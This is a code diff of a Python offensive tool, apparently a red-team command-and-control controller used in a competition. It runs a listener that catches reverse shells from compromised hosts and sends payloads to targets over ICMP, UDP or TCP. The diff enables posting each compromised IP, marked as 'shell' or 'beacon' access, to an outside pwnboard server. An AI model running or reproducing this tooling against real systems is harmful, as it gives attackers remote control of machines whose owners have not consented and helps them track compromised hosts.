@@ -12,7 +12,7 @@ import requests
 import multiprocessing
 from queue import Queue
 
-# pwnboard = "http://pwnboard.win/pwn/boxaccess"
+pwnboard = "http://pwnboard.win/pwn/boxaccess"
 
 parsedConfig = {}
 
@@ -44,8 +44,8 @@ groupparams = {
 }
 
 
-def updatePwnboard(ip):
-    data = {"ip": ip, "application": "femtocell"}
+def updatePwnboard(ip, mode):
+    data = {"ip": ip, "application": "femtocell", "access_type": mode}
     try:
         req = requests.post(pwnboard, json=data, timeout=3)
     except Exception as E:
@@ -53,14 +53,16 @@ def updatePwnboard(ip):
 
 
 def listen(queue):
+    TIME_WAIT = 0.50
+    first = True
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((shellparams["LHOST"], shellparams["LPORT"]))
     s.listen(1)
     conn, addr = s.accept()
-    print(colored(f"[+] Shell received from: {addr}\n\n", "green"))
-    first = True
-    TIME_WAIT = 0.50
+    print(colored(f"[+] Shell received from: {addr}\n", "green"))
+    updatePwnboard(shellparams["RHOST"], "shell")
     while True:
         ans = conn.recv(1024 * 128).decode()
         sys.stdout.write(ans)
@@ -84,7 +86,7 @@ def listen(queue):
 def pingListen():
     print(colored(f"[*] Waiting 10 seconds for callbacks.\n", "cyan"))
     pkts = scapy.sniff(
-        iface="bridge101", filter="icmp", timeout=10
+        iface="utun3", filter="icmp", timeout=10
     ) 
     tCallbacks = []
 
@@ -95,7 +97,7 @@ def pingListen():
     fCallbacks = list(dict.fromkeys(tCallbacks))
     for ip in fCallbacks:
         print(colored(f"[+] Ping received from: {ip}\n", "green"))
-        # updatePwnboard(ip)
+        updatePwnboard(ip, "beacon")
 
 
 def initPing(params):
@@ -478,12 +480,9 @@ def execute(plaintext, params):
         payload = plaintext.encode()
 
     if params["TRANSPORT"] == "ICMP":
-        scapy.send(
-            scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())
-            / scapy.ICMP(code=1, type=8)
-            / payload,
-            verbose=False,
-        )
+        scapy.send(scapy.IP(dst=params["RHOST"].encode(), src=params["LHOST"].encode())/
+        scapy.ICMP(code=1, type=8)/
+        payload, verbose=False)
         return
 
     if params["TRANSPORT"] == "UDP":
@@ -495,10 +494,10 @@ def execute(plaintext, params):
     try:
         sock.connect((params["RHOST"], params["RPORT"]))
         sock.send(payload)
-    except TimeoutError:
+    except (TimeoutError, ConnectionRefusedError):
         rport = params.get("RPORT")
         rhost = params.get("RHOST")
-        print(colored(f"[!] Port {rport} not open on {rhost}.", "red"))
+        print(colored(f"[-] Port {rport} not open on {rhost}.", "red"))
     finally:
         sock.close()
 
